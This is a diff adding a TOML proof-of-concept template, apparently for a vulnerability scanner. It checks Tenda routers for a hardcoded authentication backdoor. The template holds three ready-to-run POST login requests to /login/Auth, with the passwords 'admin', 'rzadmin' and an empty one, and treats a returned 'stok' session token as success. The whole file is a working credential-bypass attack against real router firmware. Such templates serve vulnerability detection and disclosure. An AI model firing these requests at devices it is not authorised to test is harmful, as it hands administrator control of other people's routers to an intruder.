@@ -1,0 +1,68 @@
+[info]
+author = "AVE"
+description = '检测 Tenda 路由器 /bin/httpd 中硬编码认证后门漏洞。login() 函数在正常 MD5 密码验证失败后，调用 GetValue("sys.rzadmin.password") 从设备配置读取预设后门密码，与用户输入明文 strcmp() 比对，匹配即授予 role=2 管理员权限。不校验用户名，任意用户名配合后门密码即可登录获取设备完全控制权。'
+id = "POC-AVE-2026-0054"
+name = "Tenda 多款路由器固件硬编码认证后门漏洞 PoC"
+severity = "critical"
+tags = ["ave-2026-0054"]
+vuln_id = [
+    "CVE-2026-11405",
+    "AVE-2026-0054",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login/Auth"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=admin"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["stok"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login/Auth"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=rzadmin"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["stok"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login/Auth"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["stok"]
